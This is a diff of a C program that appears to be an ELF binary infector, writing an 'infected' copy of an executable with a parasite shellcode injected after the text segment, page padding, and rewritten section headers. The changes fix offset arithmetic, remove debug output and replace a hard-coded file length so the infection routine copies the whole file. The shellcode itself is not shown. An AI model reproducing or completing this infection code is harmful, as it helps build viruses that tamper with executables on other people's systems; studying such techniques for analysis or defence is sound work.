@@ -122,6 +122,9 @@ int main(int argc, char * argv[]){
 	//int offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz;
   //This is the offset from the beginning of the file where the parasite will be injected.
   int parasite_injection_offset = program_headers[text_segment_index]->p_offset + program_headers[text_segment_index]->p_filesz;
+	
+	int original_offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz;
+	int new_offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz + PAGE_SIZE;
 
 	//increase p_filesz to account for new code
   puts("[03][b] Increasing p_filesz by size of new code...");
@@ -218,10 +221,11 @@ int main(int argc, char * argv[]){
 	
   printf("copying headers to new file...\n");
 	//printf("-- offset is:%d\n",offset);
-	printf("-- position is %d\n",position);
+	//printf("-- position is %d\n",position);
 	//printf("-- offset-position is:%d (0x%x)\n",offset-position,offset-position);
   //printf("-- prog_header[]->p_offset + offset - position is: %d\n",(program_headers[text_segment_index]->p_offset + offset) - position);
-	copy_partial(fd, infected_descriptor, (program_headers[text_segment_index]->p_offset + parasite_injection_offset)-position);
+	//copy_partial(fd, infected_descriptor, (program_headers[text_segment_index]->p_offset + parasite_injection_offset)-position);
+	copy_partial(fd, infected_descriptor, (original_offset-position));
 	
 	//insert the shellcode
 	write(infected_descriptor,parasite,PARASITE_SIZE);
@@ -242,10 +246,10 @@ int main(int argc, char * argv[]){
 	//write the garbage to the file
 	write(infected_descriptor, garbage, garbage_size);
 	
+	position += garbage_size;
+
 	//write everything up to section header to file
-	
-	puts("here?");
-	copy_partial(fd, infected_descriptor, elf_header->e_shentsize*elf_header->e_shnum);
+	copy_partial(fd, infected_descriptor, elf_header->e_shoff-position);
 
 	//write the section headers to the file
 	for(int i=0;i<elf_header->e_shnum; i++){
@@ -255,11 +259,14 @@ int main(int argc, char * argv[]){
 	if(lseek(fd, position+(elf_header->e_shentsize*elf_header->e_shnum),SEEK_SET)<0){
 		puts("LSEEK ERROR");
 	}
-
+	
+	int old_fd = fd;
+    int fd_filesize = lseek(fd,0,SEEK_END);
+	printf("The filesize is, %d", fd_filesize);
 
 	//write everything to end of file	
 	puts("or here?");
-	copy_partial(fd, infected_descriptor,7556-position);
+	copy_partial(old_fd, infected_descriptor, fd_filesize-position);
 	
 
 	return 0;
